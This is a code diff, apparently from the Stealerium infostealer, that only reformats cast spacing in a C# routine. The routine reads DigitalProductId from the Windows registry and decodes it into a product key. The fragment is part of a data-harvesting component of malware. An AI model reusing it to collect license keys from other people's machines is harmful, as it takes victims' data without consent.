@@ -18,8 +18,8 @@ namespace Stealerium.Target.System
         {
             var key = string.Empty;
             const int keyOffset = 52;
-            var isWin8 = (byte) ((digitalProductId[66] / 6) & 1);
-            digitalProductId[66] = (byte) ((digitalProductId[66] & 0xf7) | ((isWin8 & 2) * 4));
+            var isWin8 = (byte)((digitalProductId[66] / 6) & 1);
+            digitalProductId[66] = (byte)((digitalProductId[66] & 0xf7) | ((isWin8 & 2) * 4));
 
             const string digits = "BCDFGHJKMPQRTVWXY2346789";
             var last = 0;
@@ -30,7 +30,7 @@ namespace Stealerium.Target.System
                 {
                     current *= 256;
                     current = digitalProductId[j + keyOffset] + current;
-                    digitalProductId[j + keyOffset] = (byte) (current / 24);
+                    digitalProductId[j + keyOffset] = (byte)(current / 24);
                     current %= 24;
                     last = current;
                 }
@@ -79,8 +79,8 @@ namespace Stealerium.Target.System
                     var digitMapIndex = 0;
                     for (var j = decodeStringLength - 1; j >= 0; j--)
                     {
-                        var byteValue = (digitMapIndex << 8) | (byte) hexPid[j];
-                        hexPid[j] = (byte) (byteValue / 24);
+                        var byteValue = (digitMapIndex << 8) | (byte)hexPid[j];
+                        hexPid[j] = (byte)(byteValue / 24);
                         digitMapIndex = byteValue % 24;
                         decodedChars[i] = digits[digitMapIndex];
                     }
@@ -115,7 +115,7 @@ namespace Stealerium.Target.System
                 ?.GetValue("DigitalProductId");
             if (registryKeyValue == null)
                 return "Failed to get DigitalProductId from registry";
-            var digitalProductId = (byte[]) registryKeyValue;
+            var digitalProductId = (byte[])registryKeyValue;
             localKey.Close();
             var isWin8OrUp =
                 (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2)
